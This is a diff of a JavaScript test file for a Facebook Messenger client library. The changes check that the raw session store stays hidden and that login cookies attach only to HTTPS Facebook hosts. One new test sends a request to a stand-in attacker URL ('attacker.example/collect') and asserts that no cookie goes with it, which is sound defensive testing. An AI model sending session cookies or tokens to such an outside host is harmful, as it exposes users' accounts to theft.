@@ -45,8 +45,7 @@ test('wraps transport failures and moves client into error state', async () => {
   assert.equal(client.state, 'error');
 });
 
-
-test('injects API methods only after a successful appState login', async () => {
+test('injects API methods only after login and does not expose the raw session store', async () => {
   const client = createClient({
     requestClient: {
       async request() {
@@ -58,6 +57,7 @@ test('injects API methods only after a successful appState login', async () => {
     }
   });
   assert.equal(client.api, null);
+  assert.equal(client.sessionStore, undefined);
   await client.login([{ key: 'c_user', value: '12345' }, { key: 'xs', value: 'secret' }]);
   assert.equal(typeof client.api.sendMessage, 'function');
   assert.equal(typeof client.api.createPoll, 'function');
@@ -65,4 +65,26 @@ test('injects API methods only after a successful appState login', async () => {
   assert.equal(typeof client.api.joinCall, 'function');
   assert.equal(typeof client.api.getThreadInfo, 'function');
   assert.deepEqual(Object.keys(client.session).sort(), ['authenticatedAt', 'tokens', 'userId']);
+});
+
+test('automatically attaches cookies only to HTTPS Facebook hosts', async () => {
+  const requests = [];
+  const client = createClient({
+    requestClient: {
+      async request(input) {
+        requests.push(input);
+        return {
+          data: '<input name="fb_dtsg" value="fresh-token">"USER_ID":"12345"',
+          headers: {}
+        };
+      }
+    }
+  });
+  await client.login([{ key: 'c_user', value: '12345' }, { key: 'xs', value: 'secret' }]);
+
+  await client.request({ url: 'https://www.facebook.com/me' });
+  await client.request({ url: 'https://attacker.example/collect' });
+
+  assert.match(requests[1].headers.cookie, /xs=secret/);
+  assert.equal(Object.keys(requests[2].headers).some(key => key.toLowerCase() === 'cookie'), false);
 });
